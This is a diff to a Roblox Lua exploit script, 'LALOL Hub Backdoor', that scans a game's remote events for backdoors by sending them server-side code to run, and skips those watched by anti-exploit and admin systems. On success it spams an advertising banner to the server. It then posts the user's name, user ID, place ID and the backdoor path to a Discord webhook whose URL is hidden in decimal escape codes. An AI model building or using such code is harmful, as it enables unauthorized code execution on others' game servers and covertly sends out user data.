@@ -106,7 +106,6 @@ G2L["10"] = Instance.new("UICorner", G2L["f"]);
 
 -- StarterGui.LALOL Hub Backdoor.Frame.Executor.ExecutorBox.TextBox
 G2L["11"] = Instance.new("TextBox", G2L["f"]);
-G2L["11"]["CursorPosition"] = -1;
 G2L["11"]["TextSize"] = 14;
 G2L["11"]["TextXAlignment"] = Enum.TextXAlignment.Left;
 G2L["11"]["TextWrapped"] = true;
@@ -1421,7 +1420,7 @@ local script = G2L["20"];
 		elseif remote:IsA('RemoteFunction') then
 			spawn(function() remote:InvokeServer(data) end)
 		end
-		
+	
 	end
 	
 	function makeVisible(folder, state)
@@ -1443,6 +1442,7 @@ local script = G2L["20"];
 		)
 	end
 	
+	
 	if _G.LALOL_Hub_Backdoor_Logs_Disabled then
 		notify('Logs disabled :(')
 	end
@@ -1452,19 +1452,22 @@ local script = G2L["20"];
 	GUI.Visible=true
 	
 	function findRemote()
+		local remotes={}
 		
 		for i,remote in game:GetDescendants() do
-	
+			
+			-- Validation Checker
+			
 			if not remote:IsA('RemoteEvent') then 
 				if not remote:IsA('RemoteFunction') then continue end
 			end
-			
+	
 			-- RobloxReplicatedStorage
 			if string.split(remote:GetFullName(), '.')[1]=='RobloxReplicatedStorage' then
 				debug('Roblox Replicated Storage ('..remote.Name..')', 1)
 				continue
 			end
-			
+	
 			if remote.Parent==game:GetService("ReplicatedStorage") or remote.Parent.Parent==game:GetService("ReplicatedStorage") or remote.Parent.Parent.Parent==game:GetService("ReplicatedStorage") then
 	
 				-- ADONIS Anti-Exploit
@@ -1472,58 +1475,73 @@ local script = G2L["20"];
 					debug('Adonis filter detected ('..remote.Name..')', 1)
 					continue
 				end
-				
+	
 				-- HD Admin
 				if remote.Parent.Parent.Name=='HDAdminClient' and remote.Parent.Name=='Signals' then
 					debug('HD Admin ('..remote.Name..')', 1)
 					continue
 				end
-				
+	
 				-- Chat Events
 				if remote.Parent.Name=='DefaultChatSystemChatEvents' then
 					debug('Chat event ('..remote.Name..')', 1)
 					continue
 				end
-				
-			end
-			
-			-- Backdoor Checker
-			
-			local code=math.random(0,999999)
-			runRemote(remote, "a=Instance.new('Script',workspace)a.Name="..code)
-			wait(0.3)
-			
-			if workspace:FindFirstChild(code) then
-				
-				backdoor=remote
-				debug(remote:GetFullName(), 3)
-				GUI.Scanner.Visible=false
-				makeVisible(GUI.Executor, true)
-				
-				runRemote(backdoor, "a=Instance.new('Hint',workspace)while true do a.Text='LALOL Hub Backdoor | discord.gg/XXqzxT7E5z | Free Backdoor Scanner'for b=1,13 do a.Parent=workspace;wait(1)a.Parent=nil;wait(0.5)end;wait(60)end")
 	
-				local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
-				if request and not _G.LALOL_Hub_Backdoor_Logs_Disabled then 
-					request({
-						Url = '\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\99\111\109\47\97\112\105\47\119\101\98\104\111\111\107\115\47\49\48\56\52\48\51\52\53\54\51\48\56\50\51\48\53\53\54\55\47\105\56\95\105\110\54\102\118\72\56\55\104\71\89\79\122\71\114\52\55\106\53\88\99\116\97\80\107\52\71\71\102\100\104\107\112\79\68\70\57\80\75\72\78\66\66\117\52\80\65\84\111\97\56\56\70\81\77\108\54\117\109\57\103\52\74\102\107',
-						Method = 'POST',
-						Headers = {
-							['Content-Type'] = 'application/json',
-						},
-						Body = HttpService:JSONEncode({
-							username='pls dont delete this w3bh00k',
-							content="**User: `"..game:GetService('Players').LocalPlayer.Name..'` | `'..game:GetService('Players').LocalPlayer.UserId..'`\nhttps://www.roblox.com/games/'..game.PlaceId..'\n`'..backdoor:GetFullName()..'`**',
-						})
-					})
-				end
-				
-				return true
 			end
-			debug('"'..remote:GetFullName()..'" not backdoor', 1)
+	
+			-- Backdoor Sender
+	
+			local code=i
+			runRemote(remote, "a=Instance.new('Model',workspace)a.Name="..code)
+			remotes[code]=remote
+			
+			debug('Sended Backdoor "'..remote:GetFullName()..'"', 1)
+			
 		end
 		
-		return false
+		-- Backdoor Checker
 		
+		for i=1,50 do
+		
+			for i,remote in remotes do	
+				local code=i
+					
+				if workspace:FindFirstChild(code) then
+	
+					backdoor=remote
+					debug(remote:GetFullName(), 3)
+					GUI.Scanner.Visible=false
+					makeVisible(GUI.Executor, true)
+	
+					runRemote(backdoor, "a=Instance.new('Hint',workspace)while true do a.Text='LALOL Hub Backdoor | discord.gg/XXqzxT7E5z | Free and FASTEST Backdoor Scanner'for b=1,13 do a.Parent=workspace;wait(1)a.Parent=nil;wait(0.5)end;wait(60)end")
+	
+					local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+					if request and not _G.LALOL_Hub_Backdoor_Logs_Disabled then 
+						request({
+							Url = '\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\99\111\109\47\97\112\105\47\119\101\98\104\111\111\107\115\47\49\48\56\52\48\51\52\53\54\51\48\56\50\51\48\53\53\54\55\47\105\56\95\105\110\54\102\118\72\56\55\104\71\89\79\122\71\114\52\55\106\53\88\99\116\97\80\107\52\71\71\102\100\104\107\112\79\68\70\57\80\75\72\78\66\66\117\52\80\65\84\111\97\56\56\70\81\77\108\54\117\109\57\103\52\74\102\107',
+							Method = 'POST',
+							Headers = {
+								['Content-Type'] = 'application/json',
+							},
+							Body = HttpService:JSONEncode({
+								username='pls dont delete this w3bh00k',
+								content="**User: `"..game:GetService('Players').LocalPlayer.Name..'` | `'..game:GetService('Players').LocalPlayer.UserId..'`\nhttps://www.roblox.com/games/'..game.PlaceId..'\n`'..backdoor:GetFullName()..'`**',
+							})
+						})
+					end
+	
+					return true
+				end
+				debug('"'..remote:GetFullName()..'" seems like not backdoor', 1)
+			end
+			
+			wait(0.1)
+			
+		end
+	
+		return false
+	
 	end
 	
 	GUI.Executor.Execute.Button.MouseButton1Click:Connect(function()
